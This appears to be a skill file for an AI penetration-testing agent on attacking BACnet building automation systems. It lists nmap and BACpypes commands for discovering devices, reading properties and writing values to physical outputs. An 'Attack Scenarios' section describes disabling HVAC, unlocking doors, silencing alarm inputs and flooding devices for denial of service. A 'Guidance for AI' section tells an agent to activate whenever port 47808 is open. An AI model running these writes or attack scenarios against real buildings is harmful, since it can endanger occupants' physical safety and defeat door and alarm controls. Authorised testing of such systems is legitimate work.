# BACnet Pentesting Skill

## Goal

Identify and exploit vulnerabilities in BACnet building automation systems.

## Port

- **47808** - BACnet/IP (UDP)

## Methodology

1. **Identify BACnet:** Scan for port 47808/UDP
2. **Enumerate Devices:** Discover BACnet devices on the network
3. **Read Properties:** Query device information and values
4. **Manipulate Values:** Write to points if unauthorized
5. **Map Building Systems:** Understand HVAC, access, lighting

## Enumeration

```bash
# Nmap scan
nmap -sU -p 47808 --script bacnet-info <target>

# Broadcast device discovery
nmap -sU -p 47808 --script bacnet-info <broadcast_address>
```

## Device Discovery

```bash
# Using bacnet-scan (from BACpypes)
python3 WhoIsIAm.py

# Broadcast Who-Is
# Devices respond with I-Am containing:
# - Device ID
# - Vendor ID
# - Max APDU length
```

## Reading Properties

```bash
# Read device object
python3 ReadProperty.py <target> device:1234 objectName
python3 ReadProperty.py <target> device:1234 vendorName
python3 ReadProperty.py <target> device:1234 modelName

# Read analog/binary values
python3 ReadProperty.py <target> analogValue:1 presentValue
python3 ReadProperty.py <target> binaryOutput:1 presentValue
```

## Common Object Types

| Object Type | Description |
|-------------|-------------|
| Device | BACnet device |
| Analog Input | Sensor reading |
| Analog Output | Actuator setpoint |
| Binary Input | On/Off sensor |
| Binary Output | On/Off actuator |
| Analog Value | Configurable value |
| Binary Value | Configurable on/off |
| Schedule | Time-based automation |
| Trend Log | Historical data |

## Writing Properties

```bash
# Write to analog output (DANGEROUS - affects physical systems)
python3 WriteProperty.py <target> analogOutput:1 presentValue 75.0

# Write binary output
python3 WriteProperty.py <target> binaryOutput:1 presentValue active
```

## Information Gathering

```bash
# Get all objects
python3 ReadPropertyMultiple.py <target> device:1234 objectList

# Read schedule
python3 ReadProperty.py <target> schedule:1 presentValue

# Read trend log
python3 ReadProperty.py <target> trendLog:1 logBuffer
```

## Attack Scenarios

```bash
# Disable HVAC
- Set temperature setpoints to extremes
- Turn off heating/cooling outputs

# Access Control
- Unlock doors via binary outputs
- Disable alarm inputs

# Denial of Service
- Send rapid Who-Is broadcasts
- Overwhelm device with requests
```

## Tools

* **BACpypes** - Python BACnet library
* **Nmap** - BACnet discovery scripts
* **BASimulator** - BACnet simulator for testing
* **yabe** - Yet Another BACnet Explorer

## Guidance for AI

* Activate when port 47808/UDP is open
* BACnet controls physical building systems (HVAC, access, lighting)
* No authentication in standard BACnet/IP
* Read operations are usually unrestricted
* Write operations can affect physical safety - use extreme caution
* Industrial control systems require careful testing
